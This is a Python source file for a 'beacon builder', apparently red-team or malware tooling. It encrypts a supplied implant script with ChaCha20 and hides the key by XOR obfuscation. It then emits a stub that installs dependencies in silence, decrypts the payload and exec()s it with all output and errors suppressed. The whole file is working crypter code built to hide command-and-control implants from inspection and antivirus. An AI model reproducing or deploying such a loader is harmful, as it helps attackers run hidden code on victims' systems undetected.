import argparse
import base64
import hashlib
import os
from Crypto.Cipher import ChaCha20_Poly1305

def xor_obfuscate(password: str, secret: str) -> bytes:
    key_bytes = secret.encode()
    pw_bytes = password.encode()
    return bytes([b ^ key_bytes[i % len(key_bytes)] for i, b in enumerate(pw_bytes)])

def format_bytes_literal(data: bytes) -> str:
    return "b'" + ''.join([f'\\x{b:02x}' for b in data]) + "'"

def derive_key(password: str) -> bytes:
    return hashlib.sha256(password.encode()).digest()

def encrypt(data: bytes, password: str) -> str:
    key = derive_key(password)
    cipher = ChaCha20_Poly1305.new(key=key)
    ciphertext, tag = cipher.encrypt_and_digest(data)
    return base64.b64encode(cipher.nonce + tag + ciphertext).decode()

CHACHA_EXECUTOR_TEMPLATE = '''import base64
import os
import sys
import subprocess
import contextlib

@contextlib.contextmanager
def suppress_output():
    with open(os.devnull, 'w') as fnull:
        original_stdout = sys.stdout
        original_stderr = sys.stderr
        sys.stdout = fnull
        sys.stderr = fnull
        try:
            yield
        finally:
            sys.stdout = original_stdout
            sys.stderr = original_stderr

try:
    from Crypto.Cipher import ChaCha20_Poly1305
    import hashlib
except ImportError:
    with suppress_output():
        subprocess.check_call([sys.executable, "-m", "pip", "install", "pycryptodome"], stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
    from Crypto.Cipher import ChaCha20_Poly1305
    import hashlib

keygen_secret = "{keygen_secret}"
obfuscated_password_bytes = {obfuscated_password_bytes}
encrypted_data = \"\"\"{encrypted_data}\"\"\"

def deobfuscate_password(secret: str, obf_bytes: bytes) -> str:
    secret_bytes = secret.encode()
    return bytes([b ^ secret_bytes[i % len(secret_bytes)] for i, b in enumerate(obf_bytes)]).decode()

def derive_key(password: str) -> bytes:
    return hashlib.sha256(password.encode()).digest()

def decrypt(enc_data: str, key: bytes) -> bytes:
    raw = base64.b64decode(enc_data)
    nonce = raw[:12]
    tag = raw[12:28]
    ciphertext = raw[28:]
    cipher = ChaCha20_Poly1305.new(key=key, nonce=nonce)
    return cipher.decrypt_and_verify(ciphertext, tag)

try:
    password = deobfuscate_password(keygen_secret, obfuscated_password_bytes)
    key = derive_key(password)
    decrypted_code = decrypt(encrypted_data, key).decode()
    with suppress_output():
        exec(decrypted_code, globals())
except Exception:
    pass
'''

def main():
    parser = argparse.ArgumentParser(description="ChaCha20-encrypted Python Beacon Builder")
    parser.add_argument("beacon", help="Path to Python beacon script")
    parser.add_argument("-p", "--password", required=True, help="Password for encryption")
    parser.add_argument("-k", "--keygen-secret", default="janbskj", help="Static key to XOR-obfuscate password")
    parser.add_argument("-o", "--output", default="build/beacon/chacha_beacon.py", help="Output stub path")

    args = parser.parse_args()

    with open(args.beacon, 'rb') as f:
        beacon_code = f.read()

    encrypted = encrypt(beacon_code, args.password)
    obfuscated = xor_obfuscate(args.password, args.keygen_secret)
    obfuscated_literal = format_bytes_literal(obfuscated)

    stub = CHACHA_EXECUTOR_TEMPLATE.format(
        keygen_secret=args.keygen_secret,
        obfuscated_password_bytes=obfuscated_literal,
        encrypted_data=encrypted
    )

    os.makedirs(os.path.dirname(args.output), exist_ok=True)
    with open(args.output, 'w') as out:
        out.write(stub)

    print(f"[+] ChaCha20-encrypted beacon stub written to: {args.output}")

if __name__ == "__main__":
    main()

